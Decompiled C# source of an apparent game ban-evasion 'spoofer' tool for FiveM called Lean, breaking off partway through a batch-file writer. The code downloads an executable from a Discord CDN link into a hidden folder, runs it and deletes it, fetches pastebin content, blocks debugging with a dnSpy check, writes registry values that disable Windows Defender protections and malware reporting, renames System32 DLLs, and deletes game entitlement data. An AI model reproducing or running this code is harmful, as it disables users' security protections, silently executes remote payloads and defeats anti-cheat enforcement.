using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using Lean.Addons;
using Lean.Properties;
using Microsoft.Win32;
using Siticone.UI.AnimatorNS;
using Siticone.UI.WinForms;

namespace Lean.Forms
{
	// Token: 0x02000009 RID: 9
	public partial class Main : Form
	{
		// Token: 0x06000037 RID: 55 RVA: 0x00003268 File Offset: 0x00001468
		public Main()
		{
			System.Timers.Timer timer = new System.Timers.Timer(50.0);
			timer.AutoReset = true;
			timer.Elapsed += Main.MyMethod;
			timer.Start();
			this.bx();
			this.u.BringToFront();
		}

		// Token: 0x06000038 RID: 56 RVA: 0x00002190 File Offset: 0x00000390
		private void a(object sender, EventArgs e)
		{
			Environment.Exit(0);
		}

		// Token: 0x06000039 RID: 57 RVA: 0x000032D8 File Offset: 0x000014D8
		public static void MyMethod(object sender, ElapsedEventArgs e)
		{
			DateTime t = new DateTime(2022, 6, 20);
			if (t < DateTime.Now)
			{
				throw new ArgumentException();
			}
			Main.au();
		}

		// Token: 0x0600003A RID: 58 RVA: 0x00003314 File Offset: 0x00001514
		public static void MyMethod2(object sender, ElapsedEventArgs e)
		{
			Process[] processesByName = Process.GetProcessesByName("FiveM");
			if (processesByName.Length != 0)
			{
				Thread.Sleep(1000);
				new Process
				{
					StartInfo = 
					{
						FileName = "cmd.exe",
						CreateNoWindow = true,
						RedirectStandardInput = true,
						RedirectStandardOutput = true,
						UseShellExecute = false,
						Verb = "runas",
						Arguments = "/C netsh advfirewall firewall add rule name = \"FiveM2372Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2372_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =out new enable= no > nul"
					}
				}.Start();
				Application.Exit();
			}
		}

		// Token: 0x0600003B RID: 59 RVA: 0x000033B0 File Offset: 0x000015B0
		private void b(object sender, EventArgs e)
		{
			this.bw.Hide();
			this.bx.Hide();
			this.cb.Text = Login.KeyAuthApp.user_data.hwid;
			int num = Convert.ToInt32(Login.KeyAuthApp.app_data.numUsers);
			int num2 = num + 60;
			this.bu.Text = "Total Users: " + num2.ToString();
			string text = "C:\\Program Files\\Saved\\imgsave.gif";
			if (File.Exists(text))
			{
				string text2 = "C:\\Program Files\\Saved\\" + Main.GenID(4) + ".gif";
				File.Copy(text, text2);
				this.s.Image = new Bitmap(text2);
			}
			Main.au();
			Process[] processesByName = Process.GetProcessesByName("dnSpy");
			if (processesByName.Length == 0)
			{
				string path = "C:\\Program Files\\Win64";
				if (!Directory.Exists(path))
				{
					DirectoryInfo directoryInfo = Directory.CreateDirectory(path);
					directoryInfo.Attributes = (FileAttributes.Hidden | FileAttributes.Directory);
				}
				else
				{
					Directory.CreateDirectory("C:\\Program Files\\Win64");
					DirectoryInfo directoryInfo2 = Directory.CreateDirectory(path);
					directoryInfo2.Attributes = (FileAttributes.Hidden | FileAttributes.Directory);
				}
				this.bo.Show();
				this.bf.Hide();
				this.bq.Hide();
				this.br.Hide();
				this.be.Hide();
				this.bh.Hide();
				this.bi.Hide();
				this.bj.Hide();
				if (Login.KeyAuthApp.user_data.subscriptions[0].subscription == "Developer")
				{
					this.bo.Hide();
					this.bf.Show();
					this.be.Show();
					this.bq.Show();
					this.br.Show();
					this.bh.Show();
					this.bi.Show();
					this.bj.Show();
				}
				else if (Login.KeyAuthApp.user_data.subscriptions[0].subscription == "Premium User")
				{
					this.bo.Hide();
					this.bf.Show();
					this.be.Show();
					this.bq.Show();
					this.br.Show();
					this.bh.Show();
					this.bi.Show();
					this.bj.Show();
				}
				this.u.BringToFront();
				Login.KeyAuthApp.check();
				this.n.Text = Login.KeyAuthApp.user_data.username;
				this.m.Text = Login.KeyAuthApp.user_data.subscriptions[0].subscription;
				this.p.Text = "Version:  " + Login.KeyAuthApp.app_data.version;
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
				WebRequest webRequest = WebRequest.Create("https://pastebin.com/raw/GSXJSWtr");
				WebResponse response = webRequest.GetResponse();
				Stream responseStream = response.GetResponseStream();
				StreamReader streamReader = new StreamReader(responseStream);
				streamReader.ReadToEnd();
				WebRequest webRequest2 = WebRequest.Create("https://pastebin.com/raw/P72g9Hxd");
				WebResponse response2 = webRequest2.GetResponse();
				Stream responseStream2 = response2.GetResponseStream();
				StreamReader streamReader2 = new StreamReader(responseStream2);
				streamReader2.ReadToEnd();
			}
			else
			{
				base.Hide();
				MessageBox.Show("Debug Attempt Detected", "Lean Protection", MessageBoxButtons.OK);
				Application.Exit();
			}
		}

		// Token: 0x0600003C RID: 60 RVA: 0x0000372C File Offset: 0x0000192C
		public DateTime UnixTimeToDateTime(long unixtime)
		{
			DateTime result = new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Local);
			return result;
		}

		// Token: 0x0600003D RID: 61 RVA: 0x00002198 File Offset: 0x00000398
		private void c(object sender, EventArgs e)
		{
		}

		// Token: 0x0600003E RID: 62 RVA: 0x00003750 File Offset: 0x00001950
		private void d(object sender, EventArgs e)
		{
			DateTime now = DateTime.Now;
			this.ay.Text = string.Format("{0}/{1}/{2} {3}:{4}:{5}", new object[]
			{
				now.Day,
				now.Month,
				now.Year,
				now.Hour,
				now.Minute,
				now.Second
			});
		}

		// Token: 0x0600003F RID: 63 RVA: 0x00002198 File Offset: 0x00000398
		private void e(object sender, EventArgs e)
		{
		}

		// Token: 0x06000040 RID: 64 RVA: 0x00002198 File Offset: 0x00000398
		private void f(object sender, EventArgs e)
		{
		}

		// Token: 0x06000041 RID: 65 RVA: 0x00002198 File Offset: 0x00000398
		private void g(object sender, EventArgs e)
		{
		}

		// Token: 0x06000042 RID: 66 RVA: 0x00002198 File Offset: 0x00000398
		private void h(object sender, EventArgs e)
		{
		}

		// Token: 0x06000043 RID: 67 RVA: 0x00002198 File Offset: 0x00000398
		private void i(object sender, EventArgs e)
		{
		}

		// Token: 0x06000044 RID: 68 RVA: 0x00002198 File Offset: 0x00000398
		private void j(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000045 RID: 69 RVA: 0x00002198 File Offset: 0x00000398
		private void k(object sender, EventArgs e)
		{
		}

		// Token: 0x06000046 RID: 70 RVA: 0x00002198 File Offset: 0x00000398
		private void l(object sender, EventArgs e)
		{
		}

		// Token: 0x06000047 RID: 71 RVA: 0x0000219A File Offset: 0x0000039A
		private void m(object sender, EventArgs e)
		{
			this.u.BringToFront();
		}

		// Token: 0x06000048 RID: 72 RVA: 0x00002198 File Offset: 0x00000398
		private void n(object sender, EventArgs e)
		{
		}

		// Token: 0x06000049 RID: 73 RVA: 0x00002198 File Offset: 0x00000398
		private void o(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004A RID: 74 RVA: 0x00002198 File Offset: 0x00000398
		private void p(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004B RID: 75 RVA: 0x00002198 File Offset: 0x00000398
		private void q(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x0600004C RID: 76 RVA: 0x00002198 File Offset: 0x00000398
		private void r(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x0600004D RID: 77 RVA: 0x00002198 File Offset: 0x00000398
		private void s(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004E RID: 78 RVA: 0x00002198 File Offset: 0x00000398
		private void t(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x0600004F RID: 79 RVA: 0x00002198 File Offset: 0x00000398
		private void u(object sender, EventArgs e)
		{
		}

		// Token: 0x06000050 RID: 80 RVA: 0x00002198 File Offset: 0x00000398
		private void v(object sender, EventArgs e)
		{
		}

		// Token: 0x06000051 RID: 81 RVA: 0x000037D8 File Offset: 0x000019D8
		private void w(object sender, EventArgs e)
		{
			string path = "C:\\Program Files\\Win64";
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			if (File.Exists("C:\\Program Files\\Win64\\cache.exe"))
			{
				Process.Start("C:\\Program Files\\Win64\\cache.exe");
				Thread.Sleep(1000);
				File.Delete("C:\\Program Files\\Win64\\cache.exe");
			}
			else
			{
				string address = "https://cdn.discordapp.com/attachments/953684464104513571/956446548160573450/cache.exe";
				string fileName = "C:\\Program Files\\Win64\\cache.exe";
				WebClient webClient = new WebClient();
				webClient.DownloadFile(address, fileName);
				File.SetAttributes("C:\\Program Files\\Win64\\cache.exe", FileAttributes.Hidden);
				Thread.Sleep(1000);
				Process.Start("C:\\Program Files\\Win64\\cache.exe");
				Thread.Sleep(1000);
				File.Delete("C:\\Program Files\\Win64\\cache.exe");
			}
		}

		// Token: 0x06000052 RID: 82 RVA: 0x00002198 File Offset: 0x00000398
		private void x(object sender, EventArgs e)
		{
		}

		// Token: 0x06000053 RID: 83 RVA: 0x0000387C File Offset: 0x00001A7C
		private void y(object sender, EventArgs e)
		{
			if (this.z.Checked)
			{
				this.a = default(DiscordRpc.EventHandlers);
				DiscordRpc.Discord_Initialize("959456405922926612", ref this.a, true, null);
				this.a = default(DiscordRpc.EventHandlers);
				DiscordRpc.Discord_Initialize("959456405922926612", ref this.a, true, null);
				this.b.state = "#1 Spoofer | discord.gg/unban";
				this.b.details = "Username: " + Login.KeyAuthApp.user_data.username;
				this.b.largeImageKey = "hugo";
				DiscordRpc.Discord_UpdatePresence(ref this.b);
			}
			else
			{
				DiscordRpc.Discord_Shutdown();
			}
		}

		// Token: 0x06000054 RID: 84 RVA: 0x00002198 File Offset: 0x00000398
		private void z(object sender, EventArgs e)
		{
		}

		// Token: 0x06000055 RID: 85 RVA: 0x0000392C File Offset: 0x00001B2C
		public static void Enable_LocalAreaConection(string adapterId, bool enable = true)
		{
			string str = "Ethernet";
			foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
			{
				if (networkInterface.Id == adapterId)
				{
					str = networkInterface.Name;
					IL_40:
					string str2;
					if (enable)
					{
						str2 = "enable";
					}
					else
					{
						str2 = "disable";
					}
					ProcessStartInfo startInfo = new ProcessStartInfo("netsh", "interface set interface \"" + str + "\" " + str2);
					Process process = new Process();
					process.StartInfo = startInfo;
					process.Start();
					process.StartInfo.CreateNoWindow = true;
					process.WaitForExit();
					return;
				}
			}
			goto IL_40;
		}

		// Token: 0x06000056 RID: 86 RVA: 0x000039CC File Offset: 0x00001BCC
		public static string RandomMac()
		{
			string text = "ABCDEF0123456789";
			string text2 = "26AE";
			string text3 = "";
			Random random = new Random();
			text3 += text[random.Next(text.Length)].ToString();
			text3 += text2[random.Next(text2.Length)].ToString();
			for (int i = 0; i < 5; i++)
			{
				text3 += "-";
				text3 += text[random.Next(text.Length)].ToString();
				text3 += text[random.Next(text.Length)].ToString();
			}
			return text3;
		}

		// Token: 0x06000057 RID: 87 RVA: 0x0000219A File Offset: 0x0000039A
		private void aa(object sender, EventArgs e)
		{
			this.u.BringToFront();
		}

		// Token: 0x06000058 RID: 88 RVA: 0x00003A9C File Offset: 0x00001C9C
		public static string RandomString(int length)
		{
			return new string(Enumerable.Repeat<string>("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", length).Select(new Func<string, char>(Main.<>c.<>9.a)).ToArray<char>());
		}

		// Token: 0x06000059 RID: 89 RVA: 0x00003AE4 File Offset: 0x00001CE4
		private void ab(object sender, EventArgs e)
		{
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "Append Completion", "yes", RegistryValueKind.String);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "AutoSuggest", "yes", RegistryValueKind.String);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", "EnableAutoTray", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Copy To", "", "{C2FBB630-2971-11D1-A18C-00C04FD75D13}");
			Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Move To", "", "{C2FBB631-2971-11D1-A18C-00C04FD75D13}");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "AutoEndTasks", "1");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "HungAppTimeout", "1000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", "0");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "WaitToKillAppTimeout", "2000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "LowLevelHooksTimeout", "1000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", "0");
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoLowDiskSpaceChecks", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "LinkResolveIgnoreLinkInfo", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveSearch", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveTrack", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoInternetOpenWith", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", "2000");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagsvc", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", 1, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "GPU Priority", 8, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Priority", 6, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Scheduling Category", "High", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "SFIO Priority", "High", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "GPU Priority", 0, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Priority", 8, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Scheduling Category", "Medium", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "SFIO Priority", "High", RegistryValueKind.String);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", true).DeleteValue("Append Completion", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", true).DeleteValue("AutoSuggest", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", true).DeleteValue("EnableAutoTray", false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", "0", RegistryValueKind.DWord);
			Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Copy To", false);
			Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Move To", false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("AutoEndTasks", false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("HungAppTimeout", false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("WaitToKillAppTimeout", false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("LowLevelHooksTimeout", false);
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", "400");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", "400");
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoLowDiskSpaceChecks", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("LinkResolveIgnoreLinkInfo", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoResolveSearch", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoResolveTrack", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoInternetOpenWith", false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", "5000");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", 14, RegistryValueKind.DWord);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("GPU Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("Scheduling Category", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("SFIO Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("GPU Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("Scheduling Category", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("SFIO Priority", false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\System", "PublishUserActivities", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\SQMClient\\Windows", "CEIPEnable", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "AITEnable", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableInventory", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisablePCA", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableUAR", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Device Metadata", "PreventDeviceMetadataFromNetwork", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\AutoLogger\\SQMLogger", "Start", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\System", "AllowExperimentation", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiVirus", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableSpecialRunningModes", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRoutinelyTakingAction", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "ServiceKeepAlive", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableRealtimeMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", "ForceUpdateFromMU", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet", "DisableBlockAtFirstSeen", 1);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\MpEngine", "MpEnablePus", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "PUAProtection", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Policy Manager", "DisableScanningNetworkFiles", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRealtimeMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SpyNetReporting", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SubmitSamplesConsent", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontReportInfectionInformation", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", "1", RegistryValueKind.DWord);
			Registry.ClassesRoot.DeleteSubKeyTree("\\CLSID\\{09A47860-11B0-4DA5-AFA5-26D86198A780}", false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", "1", RegistryValueKind.DWord);
			try
			{
				if (this.aq.Text == "FiveM")
				{
					try
					{
						if (File.Exists("C:\\Program Files\\Win64\\net.bat"))
						{
							File.Move("C:\\Windows\\System32\\nvml.dll", "C:\\Windows\\System32\\nvml2.dll");
							File.Move("C:\\Windows\\System32\\nvmld.dll", "C:\\Windows\\System32\\nvmld2.dll");
						}
						if (Directory.Exists("C:\\Program Files (x86)\\Blade Group"))
						{
							Directory.Delete("C:\\Program Files (x86)\\Blade Group");
							Directory.CreateDirectory("C:\\Program Files (x86)\\Blade Group");
						}
						d d = new d();
						d.b();
					}
					catch
					{
					}
					string text = Path.ChangeExtension(Path.GetTempFileName(), ".bat");
					using (StreamWriter streamWriter = new StreamWriter(text))
					{
						streamWriter.WriteLine("echo off");
						streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q % LocalAppData%\\DigitalEntitlements");
						streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q % userprofile %\\AppData\\Roaming\\CitizenFX");
						streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
						streamWriter.WriteLine("cls");
